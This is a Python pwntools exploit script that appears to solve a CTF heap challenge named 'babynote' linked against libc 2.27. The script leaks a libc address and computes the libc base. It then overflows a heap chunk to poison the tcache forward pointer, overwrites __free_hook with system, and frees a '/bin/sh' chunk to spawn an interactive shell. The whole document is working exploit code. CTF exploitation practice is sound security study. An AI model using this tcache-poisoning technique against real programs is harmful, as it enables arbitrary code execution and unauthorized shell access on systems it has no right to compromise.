#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep

context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./babynote"
libc = ELF("./libc-2.27.so")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("example.com", 4444)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)

def create(buf):
    p.sendlineafter(">", "1")
    p.sendlineafter("Contents:", buf)

def show(index: int):
    p.sendlineafter(">", "2")
    p.sendlineafter("Index:", str(index))

def delete(index: int):
    p.sendlineafter(">", "3")
    p.sendlineafter("Index:", str(index))

p.recvuntil("YOU: ")
stdin_addr = eval(p.recvline().rstrip(b'\n'))
log.info("_IO_2_1_stdin_@libc: " + hex(stdin_addr))
libc_base = stdin_addr - libc.symbols['_IO_2_1_stdin_']
log.info("libc base: " + hex(libc_base))
free_hook_addr = libc_base + libc.symbols['__free_hook']
log.info("__free_hook@libc: " + hex(free_hook_addr))
system_addr = libc_base + libc.symbols['system']
log.info("system@libc: " + hex(system_addr))

create(b'A' * 8)# 0
create(b'B' * 8)# 1
create(b'/bin/sh')# 2
delete(1)
delete(0)
create(b'C' * 0x90 + p64(0) + p64(0xa0) + p64(free_hook_addr))# overwrite tcache fd
create(b'D' * 8)# 3
create(p64(system_addr))# 4
delete(2)

p.interactive()
